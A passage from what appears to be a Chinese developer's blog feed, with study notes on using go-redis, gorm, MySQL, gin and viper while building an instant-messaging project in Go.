&amp;gorm.Config&#123;&#125;)<br>Err(err, <span class="hljs-string">&quot;数据库连接失败&quot;</span>)<br>DB.AutoMigrate(&amp;Movie&#123;&#125;)<br>fmt.Println(<span class="hljs-string">&quot;数据库连接成功&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InsertDB</span><span class="hljs-params">(data *Movie)</span></span> &#123;<br>result := DB.Create(data)<br>Err(result.Error, <span class="hljs-string">&quot;insert failed&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(table *Movie)</span></span> TableName() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;movies&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>lang</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>go_redis</title>
    <link href="/2023/10/25/go-redis/"/>
    <url>/2023/10/25/go-redis/</url>
    
    <content type="html"><![CDATA[<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><code>go get github.com/go-redis/redis/v8</code><br>我是使用docker拉取redis镜像然后挂载本地磁盘(csdn一搜就有)</p><h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/redis/go-redis/v9&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ctx := context.Background()<br>rdb := redis.NewClient(&amp;redis.Options&#123;<br>Addr:     <span class="hljs-string">&quot;localhost:6379&quot;</span>,<br>Password: <span class="hljs-string">&quot;&quot;</span>,<br>DB:       <span class="hljs-number">0</span>,<br>&#125;)<br>    <span class="hljs-comment">//键名是name,键值是123,10s后过期(过期是键跟键值全删除,不是mysql那种软删除)</span><br>err := rdb.Set(ctx, <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-number">10</span>*time.Second).Err()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>    <span class="hljs-comment">//通过键名访问键值</span><br>val, err := rdb.Get(ctx, <span class="hljs-string">&quot;name&quot;</span>).Result()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br><br>val2, err := rdb.Get(ctx, <span class="hljs-string">&quot;key2&quot;</span>).Result()<br><span class="hljs-keyword">if</span> err == redis.Nil &#123;<br>fmt.Println(<span class="hljs-string">&quot;key2 does not exist&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;key2&quot;</span>, val2)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;name&quot;</span>, val)<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    C:GoLand\___go_build_RedisTest_go.exe</span><br><span class="hljs-comment">        key2 does not exist</span><br><span class="hljs-comment">        name 123</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">//panic的会被defer,最后执行,所以先打印key2不存在</span><br><br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>lang</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>go_project_IM</title>
    <link href="/2023/10/12/go-project-IM/"/>
    <url>/2023/10/12/go-project-IM/</url>
    
    <content type="html"><![CDATA[<h1 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h1><p>觉得写的好就给个star吧<br><a href="https://github.com/taosu0216/go_stu/tree/main/IM_project">https://github.com/taosu0216/go_stu/tree/main/IM_project</a></p><h1 id="IM即时消息系统"><a href="#IM即时消息系统" class="headerlink" title="IM即时消息系统"></a>IM即时消息系统</h1><p>照着马士兵的做的<br><a href="https://www.bilibili.com/video/BV1rK4y1w7JB/?p=5&spm_id_from=pageDriver&vd_source=593e95872463bd08c88726bf6aade29c">https://www.bilibili.com/video/BV1rK4y1w7JB/?p=5&amp;spm_id_from=pageDriver&amp;vd_source=593e95872463bd08c88726bf6aade29c</a><br>记一下中间的笔记</p><h1 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h1><p>下载gorm<br> go get gorm.io&#x2F;gorm 前面下错成 jinzhu&#x2F;gorm 了,但是说那个用的少<br>测试单独新建test目录<br>gorm文档<code>https://gorm.io/zh_CN/docs/index.html</code><br>msb的官方代码库<code>https://git.mashibing.com/msb_47094/GinChat</code><br>go官方文档(用来搜第三方包)<code>https://pkg.go.dev/</code></p><p>gorm官方文档的入门例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>  <span class="hljs-string">&quot;gorm.io/gorm&quot;</span><br>  <span class="hljs-string">&quot;gorm.io/driver/sqlite&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Product <span class="hljs-keyword">struct</span> &#123;<br>  gorm.Model<br>  Code  <span class="hljs-type">string</span><br>  Price <span class="hljs-type">uint</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  db, err := gorm.Open(sqlite.Open(<span class="hljs-string">&quot;test.db&quot;</span>), &amp;gorm.Config&#123;&#125;)<br>  <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;failed to connect database&quot;</span>)<br>  &#125;<br><br>  <span class="hljs-comment">// 迁移 schema</span><br>  db.AutoMigrate(&amp;Product&#123;&#125;)<br><br>  <span class="hljs-comment">// Create</span><br>  db.Create(&amp;Product&#123;Code: <span class="hljs-string">&quot;D42&quot;</span>, Price: <span class="hljs-number">100</span>&#125;)<br><br>  <span class="hljs-comment">// Read</span><br>  <span class="hljs-keyword">var</span> product Product<br>  db.First(&amp;product, <span class="hljs-number">1</span>) <span class="hljs-comment">// 根据整型主键查找</span><br>  db.First(&amp;product, <span class="hljs-string">&quot;code = ?&quot;</span>, <span class="hljs-string">&quot;D42&quot;</span>) <span class="hljs-comment">// 查找 code 字段值为 D42 的记录</span><br><br>  <span class="hljs-comment">// Update - 将 product 的 price 更新为 200</span><br>  db.Model(&amp;product).Update(<span class="hljs-string">&quot;Price&quot;</span>, <span class="hljs-number">200</span>)<br>  <span class="hljs-comment">// Update - 更新多个字段</span><br>  db.Model(&amp;product).Updates(Product&#123;Price: <span class="hljs-number">200</span>, Code: <span class="hljs-string">&quot;F42&quot;</span>&#125;) <span class="hljs-comment">// 仅更新非零值字段</span><br>  db.Model(&amp;product).Updates(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;<span class="hljs-string">&quot;Price&quot;</span>: <span class="hljs-number">200</span>, <span class="hljs-string">&quot;Code&quot;</span>: <span class="hljs-string">&quot;F42&quot;</span>&#125;)<br><br>  <span class="hljs-comment">// Delete - 删除 product</span><br>  db.Delete(&amp;product, <span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>视频里把sqlite改成了mysql,用phpstudy应该也可以,但为了统一还是搞一下mysql吧<br><code>https://dev.mysql.com/downloads/installer</code><br>选择内存大的那个下载,然后一路下一步就行(甲骨云真他妈麻烦)</p><ul><li><p>Server only</p></li><li><p>execute</p></li><li><p>同意</p></li><li><p>Use Legacy Authentication Method (Retain MySOL 5.x Compatibility(第二个)</p></li><li><p>一路next</p></li></ul><p>验证是否安装成功<br><code>C:\Program Files\MySQL\MySQL Server 8.0\bin</code><br>打开cmd(powershell不行!!!),运行<code>mysql -h localhost -u root -p </code>,然后输入密码,显示mysql&gt;即安装成功<br>也可以打开<code>MySQL 8.0 Command Line Client</code>快捷进入</p><p>才发现原来博客的笔记一整个完整的数据库操作都没有,麻了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">//创立新的数据库,打分号!!!<br>create database test_2023_10_12;<br>//选择数据库<br>use test_2023_10_12;<br>//建立表<br>CREATE TABLE test (<br>    time float NOT NULL<br>)ENGINE=InnoDB DEFAULT CHARSET=utf8;<br>//删除表<br>drop table test;<br>//显示已有的表,打分号!!!<br>show tables;<br></code></pre></td></tr></table></figure><p>剩下的明天再搞</p><h1 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs mysql">//查看一个表的结构<br>desc test(table name);<br>//查看一个表的数据<br>select * from test;<br>//重来一遍<br>create database IM;<br>use IM;<br>create table test(<br>id float<br>);<br>//添加字段<br>//是alter!!!<br>alter table test add email int;<br>alter table test add username char(255);<br>alter table test add passwd char(255);<br>//修改字段数据类型<br> alter table test modify email char(255);<br>//向字段添加数据<br>insert into test (username,passwd,email,id) values (&#x27;taosu&#x27;,&#x27;123456&#x27;,&#x27;123456@gmail.com&#x27;,1);<br>//多创建几个用户用于测试<br>insert into test (username,passwd,email,id) values (&#x27;yblue&#x27;,&#x27;qwerty&#x27;,&#x27;abc@qq.com&#x27;,2);<br>insert into test (username,passwd,email,id) values (&#x27;qlu_coder&#x27;,&#x27;my_password&#x27;,&#x27;1q2w@163.com&#x27;,3);<br><br>/*<br>mysql&gt; select * from test;<br>+----+------------------+-----------+-------------+<br>| id | email            | username  | passwd      |<br>+----+------------------+-----------+-------------+<br>|  1 | 123456@gmail.com | taosu     | 123456      |<br>|  2 | abc@qq.com       | yblue     | qwerty      |<br>|  3 | 1q2w@163.com     | qlu_coder | my_password |<br>+----+------------------+-----------+-------------+<br>3 rows in set (0.00 sec)<br>*/<br></code></pre></td></tr></table></figure><p>暂时跟mysql告一段落了应该,感觉还是直接用phpstudy就行了,没必要安mysql</p><h2 id="testGorm-go的操作"><a href="#testGorm-go的操作" class="headerlink" title="testGorm.go的操作"></a>testGorm.go的操作</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//第一行修改成这样,将sqlite改为mysql</span><br><span class="hljs-comment">//&quot;用户名:密码@tcp(地址:端口)/数据库名&quot;</span><br><span class="hljs-comment">//其他连接选项：charset=utf8 表示使用UTF-8字符集，parseTime=True 表示GORM将尝试解析时间字段，loc=Local 表示使用本地时区。</span><br>db, err := gorm.Open(mysql.Open(<span class="hljs-string">&quot;root:root@tcp(127.0.0.1:3306)/IM?charset=utf8&amp;parseTime=True&amp;loc=Local&quot;</span>), &amp;gorm.Config&#123;&#125;)<br></code></pre></td></tr></table></figure><p>完整的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;IM_project/models&quot;</span><br><br><span class="hljs-string">&quot;gorm.io/driver/mysql&quot;</span><br><span class="hljs-string">&quot;gorm.io/gorm&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Product <span class="hljs-keyword">struct</span> &#123;<br>gorm.Model<br>Code  <span class="hljs-type">string</span><br>Price <span class="hljs-type">uint</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//&quot;用户名:密码@tcp(地址:端口)/数据库名&quot;</span><br>db, err := gorm.Open(mysql.Open(<span class="hljs-string">&quot;root:root@tcp(127.0.0.1:3306)/IM?charset=utf8&amp;parseTime=True&amp;loc=Local&quot;</span>), &amp;gorm.Config&#123;&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;failed to connect database&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">// 迁移 schema</span><br>db.AutoMigrate(&amp;models.UserBasic&#123;&#125;)<br><br><span class="hljs-comment">// Create</span><br><span class="hljs-comment">//这里连接IM数据库后,会自动使用结构体名作为表名(按理说是全变小写+复数,但是我看的没加复数,只变成小写了)</span><br>user:=&amp;models.UserBasic&#123;&#125;<br>user.Name=<span class="hljs-string">&quot;taosu&quot;</span><br>db.Create(user)<br><br><span class="hljs-comment">// Read</span><br>fmt.Println(<span class="hljs-string">&quot;db.First(user, 1) : &quot;</span>,db.First(user, <span class="hljs-number">1</span>))<br>    <br><span class="hljs-comment">// Update - 将 user 的 password 更新为 1234</span><br>db.Model(user).Update(<span class="hljs-string">&quot;PassWord&quot;</span>, <span class="hljs-string">&quot;1234&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">打印结果</span><br><span class="hljs-comment">db.First(user, 1) :  &amp;&#123;0xc0000ec510 &lt;nil&gt; 1 0xc000068000 0&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a>迁移</h3><p>在数据库领域，”迁移”（Migration）是指通过代码和脚本来管理数据库模式（结构）的变化。迁移通常用于以下情况：</p><ul><li>创建新表格：当你需要引入新数据表时，迁移会创建该表格的结构。</li><li>修改表格结构：如果你需要添加、删除、修改或重命名表格的列，迁移会记录这些更改，并在数据库中应用它们。</li><li>填充默认数据：有时需要在表格中填充默认数据，迁移可以包含填充数据的脚本。</li><li>删除表格：如果某个表格不再需要，迁移可以包含删除该表格的操作。</li><li>数据迁移：当你需要将数据从一个表格或数据库迁移到另一个表格或数据库时，迁移也是有用的。</li></ul><h2 id="目录创建"><a href="#目录创建" class="headerlink" title="目录创建"></a>目录创建</h2><p>提前创建用于存放各种东西的目录</p><ul><li>common(感觉应该是public)</li><li>config 配置</li><li>router 路由</li><li>service 服务</li><li>sql</li></ul><p>router创建app.go,将原来的UserBasic.go改名成user_basic.go(这里不加<code>_</code>会报错,很怪)</p><h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;IM_project/router&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := router.Router()<br>r.Run(<span class="hljs-string">&quot;127.0.0.1:8099&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>在main函数中调用router函数,返回值r是 <code>*gin.Engine</code>,然后r运行在本地的8099端口</p><h3 id="IM-project-router中的router函数-app-go"><a href="#IM-project-router中的router函数-app-go" class="headerlink" title="IM_project&#x2F;router中的router函数(app.go)"></a>IM_project&#x2F;router中的router函数(app.go)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> router<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;IM_project/service&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Router</span><span class="hljs-params">()</span></span> *gin.Engine &#123;<br><span class="hljs-comment">//创建基本路由</span><br>r := gin.Default()<br><span class="hljs-comment">//处理方式放在service中处理,这里不是不是service.GetIndex()</span><br>r.GET(<span class="hljs-string">&quot;/index&quot;</span>, service.GetIndex)<br><span class="hljs-keyword">return</span> r<br>&#125;<br></code></pre></td></tr></table></figure><p>首先使用gin框架创建基本路由,这里的r也是 <code>*gin.Engine</code>类型,然后在有用户使用get请求并且请求路径为uri&#x2F;index时,调用service包的GetIndex函数,注意这里是调用service.GetIndex的函数,而不是直接使用,是告诉程序有请求时,将请求发送到service.GetIndex函数,所以这里只写函数名,而不是service.GetIndex()</p><h3 id="报错修复"><a href="#报错修复" class="headerlink" title="报错修复"></a>报错修复</h3><p>在下一个视频中,吧LoginTime,HeartbeatTime和LoginOutTime的类型从uint64修改成了time.Time,但是运行时会报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS IM_project&gt; go run &quot;IM_project\test\testGorm.go&quot;<br><br>2023/10/13 13:58:18 IM_project/test/testGorm.go:31 Error 1292 (22007): Incorrect datetime value: &#x27;0000-00-00&#x27; for column &#x27;login_time&#x27; at row 1<br>[17.203ms] [rows:0] INSERT INTO `user_basic` (`created_at`,`updated_at`,`deleted_at`,`name`,`pass_word`,`identity`,`phone`,`email`,`client_ip`,`client_port`,`login_time`,`heartbeat_time`,`login_out_time`,`is_logout`,`device_info`) VALUES (&#x27;2023-10-13 13:58:18.207&#x27;,&#x27;2023-10-13 13:58:18.207&#x27;,NULL,&#x27;taosu&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;0000-00-00 00:00:00&#x27;,&#x27;0000-00-00 00:00:00&#x27;,&#x27;0000-00-00 00:00:00&#x27;,false,&#x27;&#x27;)<br><br>2023/10/13 13:58:18 IM_project/test/testGorm.go:34 record not found<br>[1.232ms] [rows:0] SELECT * FROM `user_basic` WHERE `user_basic`.`id` = 1 AND `user_basic`.`deleted_at` IS NULL ORDER BY `user_basic`.`id` LIMIT 1<br>db.First(user, 1) :  &amp;&#123;0xc00012e480 record not found 0 0xc00028d880 0&#125;<br><br>2023/10/13 13:58:18 IM_project/test/testGorm.go:37 WHERE conditions required<br>[0.475ms] [rows:0] UPDATE `user_basic` SET `pass_word`=&#x27;1234&#x27;,`updated_at`=&#x27;2023-10-13 13:58:18.227&#x27; WHERE `user_basic`.`deleted_at` IS NULL  <br></code></pre></td></tr></table></figure><p>这里很迷,明明grom.Model里的两个时间都是time.Time类型的,但是能用,我这里把自定义的改成time.Time类型就不可以了</p><p>问了问gpt,原因是mysql库现在是严格模式,对数据的格式很严,然后time.Time的零值好像是格式有点问题,是存不进去的,然后可以修改成兼容模式<br>打开mysql终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">//查看当前模式<br>SELECT @@sql_mode;<br>//修改成兼容模式<br>SET GLOBAL sql_mode = &#x27;NO_ENGINE_SUBSTITUTION&#x27;;<br></code></pre></td></tr></table></figure><p>不报错了</p><p>第二天有报错了,这玩意好像每重启电脑就得设置一遍</p><h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>创建utils目录,建立system_init.go,在config目录下创建app.yml</p><p>“utils” 是一个缩写，通常用于描述一组实用工具或函数，这些工具和函数可以帮助程序员更容易地完成一些常见的任务，例如处理日期和时间、处理字符串、读写文件、执行数学运算等。这些工具旨在节省开发时间和减少代码的冗余，因此开发人员可以更轻松地构建应用程序。所以，当你在代码中看到 “utils”，它通常指的是一组实用的程序代码，用于处理各种常见编程任务。</p><h1 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h1><h2 id="viper"><a href="#viper" class="headerlink" title="viper"></a>viper</h2><p>下载<br><code>go get github.com/spf13/viper</code><br>导入需要</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;github.com/spf13/viper&quot;</span><br></code></pre></td></tr></table></figure><ul><li><p>设置默认值</p></li><li><p>从JSON、TOML、YAML、HCL、envfile和Java properties格式的配置文件读取配置信息</p></li><li><p>实时监控和重新读取配置文件（可选）</p></li><li><p>从环境变量中读取</p></li><li><p>从远程配置系统（etcd或Consul）读取并监控配置变化</p></li><li><p>从命令行参数读取配置</p></li><li><p>从buffer读取配置</p></li><li><p>显式配置值</p></li></ul><p>Viper能够为你执行下列操作：</p><ul><li>查找、加载和反序列化<code>JSON</code>、<code>TOML</code>、<code>YAML</code>、<code>HCL</code>、<code>INI</code>、<code>envfile</code>和<code>Java properties</code>格式的配置文件。</li><li>提供一种机制为你的不同配置选项设置默认值。</li><li>提供一种机制来通过命令行参数覆盖指定选项的值。</li><li>提供别名系统，以便在不破坏现有代码的情况下轻松重命名参数。</li><li>当用户提供了与默认值相同的命令行或配置文件时，可以很容易地分辨出它们之间的区别。</li></ul><p>Viper会按照下面的优先级。每个项目的优先级都高于它下面的项目:</p><ul><li>显示调用<code>Set</code>设置值</li><li>命令行参数（flag）</li><li>环境变量</li><li>配置文件</li><li>key&#x2F;value存储</li><li>默认值</li></ul><p>!!! 说人话就是帮忙管理yml,json等这种配置文件的工具 !!!</p><p>现在有种感觉就是写之前那个test,就是为了把请求的过程一点点分成很多份,然后分给不同的函数,比如本来test的请求就是直接连接数据库,然后这里是把数据库的信息存放在yml文件中,然后通过viper管理并获取,然后拼接到初始化mysql连接的函数中,然后需要时再调用初始化函数,可能是为了安全和方便修改?</p><h2 id="InitMySQL调整"><a href="#InitMySQL调整" class="headerlink" title="InitMySQL调整"></a>InitMySQL调整</h2><p>本来是直接mysql.dns获取,改成分批获取配置,增加可读性,更好维护</p><p>app.yml</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go">mysql:<br>  dns: root:root@tcp(<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3306</span>)/IM?charset=utf8mb4&amp;parseTime=True&amp;loc=Local<br>  username: root<br>  passwd: root<br>  host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>  port: <span class="hljs-number">3306</span><br>  db: IM<br>  options:<br>    charset: utf8mb4<br>    parseTime: <span class="hljs-literal">true</span><br>    loc: Local<br></code></pre></td></tr></table></figure><p>InitMySQL</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitMySQL</span><span class="hljs-params">()</span></span> &#123;<br>username := viper.GetString(<span class="hljs-string">&quot;mysql.username&quot;</span>)<br>passwd := viper.GetString(<span class="hljs-string">&quot;mysql.passwd&quot;</span>)<br>host := viper.GetString(<span class="hljs-string">&quot;mysql.host&quot;</span>)<br>port := viper.GetString(<span class="hljs-string">&quot;mysql.port&quot;</span>)<br>db := viper.GetString(<span class="hljs-string">&quot;mysql.db&quot;</span>)<br>options := viper.Sub(<span class="hljs-string">&quot;mysql.options&quot;</span>)<br>charset := options.GetString(<span class="hljs-string">&quot;charset&quot;</span>)<br>parseTime := options.GetBool(<span class="hljs-string">&quot;parseTime&quot;</span>)<br>loc := options.GetString(<span class="hljs-string">&quot;loc&quot;</span>)<br>databaseURL := fmt.Sprintf(<span class="hljs-string">&quot;%s:%s@tcp(%s:%s)/%s?charset=%s&amp;parseTime=%t&amp;loc=%s&quot;</span>, username, passwd, host, port, db, charset, parseTime, loc)<br>DB, _ = gorm.Open(mysql.Open(databaseURL), &amp;gorm.Config&#123;&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h3><p>username :&#x3D; viper.GetString(“mysql.username”) 这里是直接获取mysql.username,万一后面不止获取app.yml,又获取了app2.yml,并且app2.yml也有mysql.username这个配置项,这个语句会获取哪个信息</p><p>可能是把所有配置都放在app.yml文件里了所以没有这个问题?</p><h3 id="swag"><a href="#swag" class="headerlink" title="swag"></a>swag</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> install 